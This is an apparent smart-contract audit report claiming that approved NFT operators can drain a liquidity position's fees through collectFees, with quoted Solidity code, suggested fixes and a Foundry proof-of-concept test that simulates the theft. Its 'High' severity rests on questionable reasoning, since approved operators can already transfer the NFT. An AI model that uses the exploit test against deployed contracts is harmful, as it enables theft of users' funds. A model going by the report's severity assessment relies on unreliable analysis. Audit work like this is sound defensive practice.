## Title
Approved Operators Can Steal Position Fees Through collectFees Function

## Summary
The `collectFees` function in `BasePositions.sol` uses the `authorizedForNft` modifier which allows any approved operator (not just the owner) to collect accumulated fees to an arbitrary recipient address. This enables fee theft when position owners grant legitimate NFT approvals to marketplaces, lending protocols, or other DeFi integrations.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** According to the interface documentation, `collectFees` should allow the position owner to collect their accumulated trading fees. [2](#0-1) 

**Actual Logic:** The function uses the `authorizedForNft` modifier which checks `_isApprovedOrOwner(msg.sender, id)` from Solady's ERC721 implementation. [3](#0-2)  This allows any address that has been granted approval (via `approve()` or `setApprovalForAll()`) to collect fees to themselves.

**Exploitation Path:**
1. Alice owns position NFT #123 with 10 ETH in accumulated fees from providing liquidity
2. Alice lists her NFT on a marketplace or uses it in a lending protocol, calling `approve(marketplace, 123)` or `setApprovalForAll(marketplace, true)`
3. Bob (marketplace operator or exploiter) calls `positions.collectFees(123, poolKey, tickLower, tickUpper, bob_address)`
4. The `authorizedForNft(123)` modifier passes since Bob's address is approved
5. Bob receives all 10 ETH of Alice's accumulated fees
6. Alice's position retains liquidity but all her earned fees are stolen

**Security Property Broken:** This violates the **Fee Accounting** invariant: "Position fee collection must be accurate and never allow double-claiming." While not technically double-claiming, it allows unauthorized fee extraction by approved operators, violating reasonable user expectations about NFT approvals.

## Impact Explanation
- **Affected Assets**: All accumulated trading fees (token0 and token1) for any position where the owner has granted NFT approval
- **Damage Severity**: Complete loss of accumulated fees. An attacker can drain 100% of fees from all positions they have approval for
- **User Impact**: Any position owner who grants approval to marketplaces, lending protocols, position managers, or automated services is at risk. This affects the entire user base using standard DeFi integrations.

## Likelihood Explanation
- **Attacker Profile**: Any approved operator - marketplace contracts, lending protocols, compromised integration contracts, or malicious actors who gain approval through social engineering
- **Preconditions**: Position must have accumulated fees and owner must have granted approval (extremely common scenario in DeFi)
- **Execution Complexity**: Single transaction - attacker simply calls `collectFees` with their address as recipient
- **Frequency**: Can be exploited repeatedly as fees accumulate, affecting all approved positions continuously

## Recommendation

The `collectFees` function should only allow the actual position owner to collect fees, not approved operators. Approvals should only grant the ability to transfer the NFT, not extract value from it.

**Recommended Fix:**

Modify the `collectFees` functions to use `onlyOwnerOf` instead of `authorizedForNft`:

```solidity
// In src/base/BasePositions.sol, lines 100-117:

// CURRENT (vulnerable):
function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper)
    public
    payable
    authorizedForNft(id)
    returns (uint128 amount0, uint128 amount1)
{
    (amount0, amount1) = collectFees(id, poolKey, tickLower, tickUpper, msg.sender);
}

function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper, address recipient)
    public
    payable
    authorizedForNft(id)
    returns (uint128 amount0, uint128 amount1)
{
    (amount0, amount1) = withdraw(id, poolKey, tickLower, tickUpper, 0, recipient, true);
}

// FIXED:
function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper)
    public
    payable
    returns (uint128 amount0, uint128 amount1)
{
    // Only NFT owner can collect fees
    if (ownerOf(id) != msg.sender) revert NotUnauthorizedForToken(msg.sender, id);
    (amount0, amount1) = collectFees(id, poolKey, tickLower, tickUpper, msg.sender);
}

function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper, address recipient)
    public
    payable
    returns (uint128 amount0, uint128 amount1)
{
    // Only NFT owner can collect fees to any recipient
    if (ownerOf(id) != msg.sender) revert NotUnauthorizedForToken(msg.sender, id);
    (amount0, amount1) = withdraw(id, poolKey, tickLower, tickUpper, 0, recipient, true);
}
```

**Alternative Mitigation:** Restrict the recipient parameter to only allow `msg.sender` when called by approved operators (not owners):

```solidity
function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper, address recipient)
    public
    payable
    authorizedForNft(id)
    returns (uint128 amount0, uint128 amount1)
{
    // If not owner, can only collect to msg.sender
    if (ownerOf(id) != msg.sender && recipient != msg.sender) {
        revert("Approved operators can only collect to themselves");
    }
    (amount0, amount1) = withdraw(id, poolKey, tickLower, tickUpper, 0, recipient, true);
}
```

**Note:** The same issue exists in the `withdraw` function which also allows approved operators to withdraw liquidity and fees to arbitrary addresses. [4](#0-3)  The same fix should be applied there, or at minimum, the custom recipient parameter should be restricted to the owner.

Similarly, `Orders.sol` has the same vulnerability pattern with `collectProceeds` and `decreaseSaleRate`. [5](#0-4) 

## Proof of Concept

```solidity
// File: test/Exploit_ApprovedOperatorFeeTheft.t.sol
// Run with: forge test --match-test test_ApprovedOperatorStealsFeesViaCollectFees -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";

contract Exploit_ApprovedOperatorFeeTheft is FullTest {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob"); // Malicious approved operator
    
    function setUp() public override {
        super.setUp();
        
        // Give Alice tokens
        token0.transfer(alice, 1000e18);
        token1.transfer(alice, 1000e18);
    }
    
    function test_ApprovedOperatorStealsFeesViaCollectFees() public {
        // SETUP: Alice creates a position and it accumulates fees
        PoolKey memory poolKey = createPool(0, 1 << 63, 100);
        
        vm.startPrank(alice);
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        
        // Alice mints position and deposits liquidity
        (uint256 alicePositionId,) = createPosition(poolKey, -100, 100, 100e18, 100e18);
        assertEq(positions.ownerOf(alicePositionId), alice, "Alice should own the position");
        vm.stopPrank();
        
        // Generate fees by making swaps
        token0.approve(address(router), type(uint256).max);
        router.swap(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: SqrtRatio.wrap(0), skipAhead: 0}),
            TokenAmount({token: address(token0), amount: 50e18}),
            type(int256).min
        );
        
        // Verify fees accumulated (view function)
        (,,,uint128 fees0Before, uint128 fees1Before) = 
            positions.getPositionFeesAndLiquidity(alicePositionId, poolKey, -100, 100);
        assertGt(fees0Before, 0, "Position should have accumulated fees");
        
        uint256 bobBalanceBefore = token0.balanceOf(bob);
        
        // EXPLOIT: Alice approves Bob (e.g., for marketplace listing)
        vm.prank(alice);
        positions.approve(bob, alicePositionId);
        
        // Bob exploits the approval to steal fees
        vm.prank(bob);
        (uint128 stolenAmount0, uint128 stolenAmount1) = 
            positions.collectFees(alicePositionId, poolKey, -100, 100, bob);
        
        // VERIFY: Bob received Alice's fees
        assertEq(token0.balanceOf(bob), bobBalanceBefore + stolenAmount0, "Bob should have received stolen fees");
        assertEq(stolenAmount0, fees0Before, "Bob stole all accumulated fees");
        assertGt(stolenAmount0, 0, "Bob stole non-zero amount");
        
        // Alice still owns the position but lost all fees
        assertEq(positions.ownerOf(alicePositionId), alice, "Alice still owns position");
        (,,,uint128 fees0After,) = 
            positions.getPositionFeesAndLiquidity(alicePositionId, poolKey, -100, 100);
        assertEq(fees0After, 0, "All fees were stolen from Alice's position");
        
        console.log("Vulnerability confirmed:");
        console.log("- Bob stole %e token0 fees from Alice", stolenAmount0);
        console.log("- Alice still owns position but lost all accumulated fees");
    }
}
```

## Notes

This vulnerability stems from a fundamental design choice to allow approved operators full control over positions, including fee extraction. While this may be intentional for certain use cases (e.g., automated position managers), it violates standard NFT security expectations where approvals grant transfer rights but not value extraction rights.

The issue is systemic across both `BasePositions.sol` (affecting liquidity positions) and `Orders.sol` (affecting TWAMM orders), suggesting it may be an architectural design decision rather than an oversight. However, it creates significant security risk for users who follow standard DeFi practices of approving marketplaces and integrations. [6](#0-5)

### Citations

**File:** src/base/BasePositions.sol (L100-117)
```text
    function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper)
        public
        payable
        authorizedForNft(id)
        returns (uint128 amount0, uint128 amount1)
    {
        (amount0, amount1) = collectFees(id, poolKey, tickLower, tickUpper, msg.sender);
    }

    /// @inheritdoc IPositions
    function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint128 amount0, uint128 amount1)
    {
        (amount0, amount1) = withdraw(id, poolKey, tickLower, tickUpper, 0, recipient, true);
    }
```

**File:** src/base/BasePositions.sol (L120-133)
```text
    function withdraw(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 liquidity,
        address recipient,
        bool withFees
    ) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
        (amount0, amount1) = abi.decode(
            lock(abi.encode(CALL_TYPE_WITHDRAW, id, poolKey, tickLower, tickUpper, liquidity, recipient, withFees)),
            (uint128, uint128)
        );
    }
```

**File:** src/interfaces/IPositions.sol (L59-82)
```text
    /// @notice Collects accumulated fees from a position to msg.sender
    /// @param id The NFT token ID representing the position
    /// @param poolKey Pool key identifying the pool
    /// @param tickLower Lower tick of the price range of the position
    /// @param tickUpper Upper tick of the price range of the position
    /// @return amount0 Amount of token0 fees collected
    /// @return amount1 Amount of token1 fees collected
    function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper)
        external
        payable
        returns (uint128 amount0, uint128 amount1);

    /// @notice Collects accumulated fees from a position to a specified recipient
    /// @param id The NFT token ID representing the position
    /// @param poolKey Pool key identifying the pool
    /// @param tickLower Lower tick of the price range of the position
    /// @param tickUpper Upper tick of the price range of the position
    /// @param recipient Address to receive the collected fees
    /// @return amount0 Amount of token0 fees collected
    /// @return amount1 Amount of token1 fees collected
    function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper, address recipient)
        external
        payable
        returns (uint128 amount0, uint128 amount1);
```

**File:** src/base/BaseNonfungibleToken.sol (L81-86)
```text
    modifier authorizedForNft(uint256 id) {
        if (!_isApprovedOrOwner(msg.sender, id)) {
            revert NotUnauthorizedForToken(msg.sender, id);
        }
        _;
    }
```

**File:** src/Orders.sol (L77-94)
```text
    function decreaseSaleRate(uint256 id, OrderKey memory orderKey, uint112 saleRateDecrease, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint112 refund)
    {
        refund = uint112(
            uint256(
                -abi.decode(
                    lock(
                        abi.encode(
                            CALL_TYPE_CHANGE_SALE_RATE, recipient, id, orderKey, -int256(uint256(saleRateDecrease))
                        )
                    ),
                    (int256)
                )
            )
        );
```

**File:** src/Orders.sol (L107-119)
```text
    function collectProceeds(uint256 id, OrderKey memory orderKey, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint128 proceeds)
    {
        proceeds = abi.decode(lock(abi.encode(CALL_TYPE_COLLECT_PROCEEDS, id, orderKey, recipient)), (uint128));
    }

    /// @inheritdoc IOrders
    function collectProceeds(uint256 id, OrderKey memory orderKey) external payable returns (uint128 proceeds) {
        proceeds = collectProceeds(id, orderKey, msg.sender);
    }
```
